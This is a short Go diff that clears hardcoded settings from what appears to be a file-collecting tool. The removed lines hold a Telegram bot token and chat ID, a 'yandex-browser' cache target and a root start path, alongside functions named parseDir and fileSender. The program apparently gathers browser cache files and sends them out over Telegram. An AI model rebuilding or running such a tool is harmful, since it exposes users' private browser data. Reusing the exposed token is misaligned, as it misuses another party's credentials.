@@ -20,11 +20,11 @@ var (
 	rwMutex   sync.RWMutex
 	resultDir string
 	wg        sync.WaitGroup
-	botToken  string = "7770330431:AAFit8pP9WoOgteTDDMKJ50kb4HgMlKdPus"
-	chatId    string = "6623770793"
-	flag      string = "Cache"
-	subFlag   string = "yandex-browser"
-	startPath string = "/"
+	botToken  string = ""
+	chatId    string = ""
+	flag      string = ""
+	subFlag   string = ""
+	startPath string = ""
 )
 
 // dir parser
@@ -121,7 +121,6 @@ func fileSender(data string) {
 
 // init function
 func main() {
-	// dirs parse section
 	wg.Add(1)
 	go parseDir(startPath, flag, &wg)
 	wg.Wait()
